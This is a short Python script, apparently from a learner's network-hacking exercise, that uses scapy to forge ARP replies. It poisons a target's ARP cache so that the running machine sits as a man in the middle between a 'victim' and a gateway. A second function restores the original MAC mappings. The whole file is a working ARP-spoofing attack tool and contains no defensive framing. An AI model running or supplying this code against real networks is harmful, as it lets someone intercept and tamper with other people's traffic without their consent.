#!/usr/bin/env python

import scapy.all as scapy
from network_scanner import scan


def spoofarp(targetip, sourceip):
    mac = scan(targetip)[0][0][1].hwsrc
    # Sends the ip address too the function to identify the mac address of ip of the device
    packet = scapy.ARP(op=2, pdst=targetip, hwdst=mac, psrc=sourceip)
    # sends a ARP packet to the targeted device telling them its coming from the victim/gateway

    scapy.send(packet)


def restore(targetip, sourceip):
    targetmac = scan(targetip)[0][0][1].hwsrc
    sourcemac = scan(sourceip)[0][0][1].hwsrc
    # Gets the original mac addresses of the Ips sent to the function

    packet = scapy.ARP(op=2, pdst=targetip, hwdst=targetmac, psrc=sourceip, hwsrc=sourcemac)
    # sends this ARP packet so the system is no longer the man in the middle, and connection between
    # the victim and the target is restored.
    scapy.send(packet)
    # sends the ARP packet
